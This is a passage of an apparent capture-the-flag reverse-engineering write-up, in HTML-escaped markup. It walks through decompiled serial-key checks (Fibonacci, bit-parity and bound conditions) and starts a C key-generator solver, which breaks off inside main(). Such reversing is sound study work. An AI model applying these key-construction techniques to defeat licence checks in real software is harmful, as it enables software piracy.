&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// rax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4; &lt;span style=&#34;color:#75715e&#34;&gt;// rax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-C0h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; v7; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+1Bh] [rbp-B5h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;char_from_pb_key; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+20h] [rbp-B0h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v10[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+38h] [rbp-98h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; sub_serial[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+50h] [rbp-80h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v12; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+6Ch] [rbp-64h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; count; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+70h] [rbp-60h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; sub_serial_v12[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+88h] [rbp-48h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; pos_v13; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+A0h] [rbp-30h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v16; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+A8h] [rbp-28h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v17[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+B0h] [rbp-20h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  _BOOL4 v18; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+CCh] [rbp-4h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;basic_string&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;nullptr_t&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(v17, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
  v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
  pos_v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
  std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;basic_string((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)sub_serial_v12);
  count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ) {
    pos_v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;find(a2, v17, &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( pos_v13 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;count;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( pos_v13 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; ) {
      v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; L_EXIT;
    }
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;substr(sub_serial, a2, &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3LL&lt;/span&gt;);
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)sub_serial_v12, (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)sub_serial);
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::~&lt;/span&gt;string(sub_serial);
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;basic_string(v10, sub_serial_v12);
    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v16&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    char_from_pb_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;at(a1, v2);
    v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;verify_char(v10, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;char_from_pb_key);
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::~&lt;/span&gt;string(v10);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v7 ) {
      v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; L_EXIT;
    }
    v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pos_v13;
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;length(v17);
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;erase(a2, &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;, v3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( count &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; ) {
    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;c_str(a2);
    v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strncmp(v4, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bss&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3uLL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
    v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  }
  v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
L_EXIT:
  std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::~&lt;/span&gt;string(sub_serial_v12);
  std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::~&lt;/span&gt;string(v17);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v18;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This function splits the Serial Key into 20 parts by &lt;code&gt;-&lt;/code&gt; and requires each part to be 3 in length, ending with &lt;code&gt;bss&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The three characters of each Serial Key part and one Public Key character in the corresponding position are passed to the &lt;code&gt;verify_char()&lt;/code&gt; function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;_BOOL8 &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;verify_char&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; a2) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v2; &lt;span style=&#34;color:#75715e&#34;&gt;// rax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v5; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+0h] [rbp-20h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-18h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v7; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-10h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;c_str(a1);
  v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strtol(v2, &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;);
  v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fib(v7);                                 &lt;span style=&#34;color:#75715e&#34;&gt;// fib / 100
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v6;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v5;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;check_arm(v5) );
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)notused(v5) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10E47F4C575565LL&lt;/span&gt; );
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; ) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)isprint(a2) ) {
      v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; UN&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
      used[v3] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v5;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (v6 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v5) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; a2;
    }
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This function first converts the hex string (format of input) to int, then uses &lt;code&gt;fib()&lt;/code&gt; to calculate the value of that index in the Fibonacci series and divides it by 100 to return &lt;code&gt;v6&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;check_arm()&lt;/code&gt; function is as follows&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;_BOOL8 &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_arm&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (countSetBits(a1) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;countSetBits&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+0h] [rbp-Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( a1 ) {
    a1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; a1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v2;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v2;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;countSetBits()&lt;/code&gt; is used to calculate the number of 1 in the binary form of the argument, so the number of 1 is odd to exit the inner &lt;code&gt;do while&lt;/code&gt; loop. For the outer loop, the number &lt;code&gt;v5&lt;/code&gt; must be less than 0x10E47F4C575565, and &lt;code&gt;notused()&lt;/code&gt; will record the previous &lt;code&gt;v5&lt;/code&gt; and cannot be reused.&lt;/p&gt;
&lt;p&gt;In addition, since &lt;code&gt;v6 - v5 &amp;gt; 0x20&lt;/code&gt; (&lt;code&gt;isprint(a2)&lt;/code&gt; and &lt;code&gt;(v6 - v5) % 100 == a2&lt;/code&gt;) is required, it is obvious that the upper limit of &lt;code&gt;v5&lt;/code&gt; needs to be used in the construction. So that the value of &lt;code&gt;v5&lt;/code&gt; in 20 calculations can be determined, and the Serial Key and Public Key can be constructed by finding &lt;code&gt;(v6, a2)&lt;/code&gt; that match the condition.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fib&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; x) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; v5[&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;];
    v5[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    v5[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; x; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
        v5[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v5[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v5[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v5[x] &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100uLL&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;countSetBits&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; x) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (x) {
        x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        v2&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v2;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_arm&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; x) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (countSetBits(x) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
        &lt;span style=&#34;color:#f92672&#34;&gt;--*&lt;/span&gt;v5;
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;check_arm(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; v7;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10E47F4C575565LL&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; serial[&lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; public[&lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;];
